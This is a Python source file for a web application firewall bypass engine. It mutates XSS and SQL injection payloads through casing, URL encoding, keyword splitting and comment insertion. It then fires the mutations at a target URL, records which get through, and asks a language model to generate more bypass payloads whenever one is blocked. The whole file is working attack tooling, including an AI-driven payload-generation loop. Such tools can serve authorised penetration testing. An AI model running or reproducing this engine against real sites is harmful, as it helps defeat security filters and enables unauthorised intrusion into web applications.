import asyncio
from typing import List, Dict, Any
import random
import re
from core.ai import ask_mixtral

# --- Advanced WAF Bypass Engine ---
class WAFBypassEngine:
    def __init__(self):
        self.bypass_attempts = []
        self.successful_bypasses = []
        
    async def mutate_payload(self, payload: str, technique: str = 'auto') -> List[str]:
        """Generate WAF bypass mutations"""
        mutations = [payload]
        
        if technique == 'auto' or technique == 'casing':
            # Case variations
            mutations.extend([
                payload.swapcase(),
                payload.upper(),
                payload.lower(),
                ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
            ])
        
        if technique == 'auto' or technique == 'encoding':
            # URL encoding variations
            mutations.extend([
                ''.join(['%' + hex(ord(c))[2:] for c in payload]),
                ''.join(['%' + hex(ord(c))[2:].upper() for c in payload]),
                payload.replace('<', '%3C').replace('>', '%3E').replace('"', '%22')
            ])
        
        if technique == 'auto' or technique == 'splitting':
            # Keyword splitting
            mutations.extend([
                payload.replace('script', 'scr' + 'ipt'),
                payload.replace('alert', 'ale' + 'rt'),
                payload.replace('union', 'un' + 'ion'),
                payload.replace('select', 'sel' + 'ect')
            ])
        
        if technique == 'auto' or technique == 'comments':
            # Comment insertion
            mutations.extend([
                payload.replace('<script>', '<scr/*x*/ipt>'),
                payload.replace('alert', 'ale/*x*/rt'),
                payload.replace('union', 'un/*x*/ion')
            ])
        
        return list(set(mutations))
    
    async def ai_suggest_bypass(self, blocked_payload: str, response_code: int, response_body: str) -> List[str]:
        """Use AI to suggest WAF bypass techniques"""
        prompt = f"""
        WAF Bypass Analysis:
        - Blocked Payload: {blocked_payload}
        - Response Code: {response_code}
        - Response Body: {response_body[:200]}
        
        Suggest 3 specific bypass techniques for this WAF pattern.
        Output only the bypassed payloads, one per line.
        """
        
        try:
            response = await ask_mixtral(prompt)
            suggestions = [line.strip() for line in response.split('\n') if line.strip()]
            return suggestions[:3]  # Limit to 3 suggestions
        except Exception as e:
            return [f"[AI Error] {e}"]
    
    async def test_bypass(self, target_url: str, payload: str, headers: Dict[str, str] = None) -> Dict[str, Any]:
        """Test a bypass payload against target"""
        import aiohttp
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(target_url, params={'test': payload}, headers=headers, timeout=10) as resp:
                    result = {
                        'payload': payload,
                        'status_code': resp.status,
                        'response_length': len(await resp.text()),
                        'blocked': resp.status in [403, 406, 429],
                        'success': resp.status == 200
                    }
                    
                    self.bypass_attempts.append(result)
                    if result['success']:
                        self.successful_bypasses.append(result)
                    
                    return result
        except Exception as e:
            return {'payload': payload, 'error': str(e), 'blocked': True}
    
    async def run_bypass_campaign(self, target_url: str, base_payloads: List[str], 
                                 techniques: List[str] = None) -> Dict[str, Any]:
        """Run complete WAF bypass campaign"""
        if techniques is None:
            techniques = ['casing', 'encoding', 'splitting', 'comments']
        
        all_mutations = []
        for payload in base_payloads:
            for technique in techniques:
                mutations = await self.mutate_payload(payload, technique)
                all_mutations.extend(mutations)
        
        # Test all mutations
        results = []
        for mutation in all_mutations:
            result = await self.test_bypass(target_url, mutation)
            results.append(result)
            
            # If blocked, try AI suggestions
            if result.get('blocked', False):
                ai_suggestions = await self.ai_suggest_bypass(
                    mutation, result.get('status_code', 0), ""
                )
                for suggestion in ai_suggestions:
                    ai_result = await self.test_bypass(target_url, suggestion)
                    results.append(ai_result)
        
        return {
            'total_tested': len(results),
            'successful_bypasses': len(self.successful_bypasses),
            'bypass_rate': len(self.successful_bypasses) / len(results) if results else 0,
            'results': results
        }
    
    async def save_bypass_logs(self, output_path: str = 'reports/waf_attempts.json'):
        """Save bypass attempts to JSON log"""
        import json
        from pathlib import Path
        
        log_data = {
            'bypass_attempts': self.bypass_attempts,
            'successful_bypasses': self.successful_bypasses,
            'summary': {
                'total_attempts': len(self.bypass_attempts),
                'successful': len(self.successful_bypasses),
                'success_rate': len(self.successful_bypasses) / len(self.bypass_attempts) if self.bypass_attempts else 0
            }
        }
        
        Path(output_path).parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, 'w') as f:
            json.dump(log_data, f, indent=2)
        
        return output_path 